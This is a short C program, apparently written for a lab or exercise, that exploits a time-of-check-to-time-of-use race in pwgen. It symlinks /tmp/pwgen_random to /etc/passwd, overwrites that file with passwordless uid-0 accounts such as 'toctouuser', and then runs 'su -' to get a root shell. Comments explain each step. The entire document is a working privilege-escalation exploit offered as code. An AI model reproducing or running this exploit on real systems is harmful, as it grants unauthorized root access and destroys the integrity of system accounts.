#include <stdio.h> 
#include "stdlib.h"
#include <unistd.h> 

#define FILENAME "/tmp/pwgen_random"
int main(){
    FILE *file; 
    
    file = popen("pwgen -e", "w"); // open pwgen, with write access 
    
    // now we want to unlink the FILENAME and then link to the passwd file 
    unlink(FILENAME); 
    
    // now /tmp/pwgen_random points to /etc/passwd
    symlink("/etc/passwd", FILENAME); 
    
    //we can now input a new user access that has uid==0, requires no password and will spawn a shell bin/sh by default when su is called
    
    fprintf(file, "::1000:1000:root:/root:/bin/sh\nroot::0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nDebian-exim:x:102:102::/var/spool/exim4:/bin/false\nuser::1000:1000::/home/user:/bin/sh\nhalt::0:1001::/:/sbin/halt\nsshd:x:100:65534::/var/run/sshd:/usr/sbin/nologin\ntoctouuser::0:0:root:/root:/bin/bash\n"); 
    fclose(file); // close the file, we already got what we want anywway 

    system("su -"); // log in as toctouuser, which has root privileges 
    return 0; 
}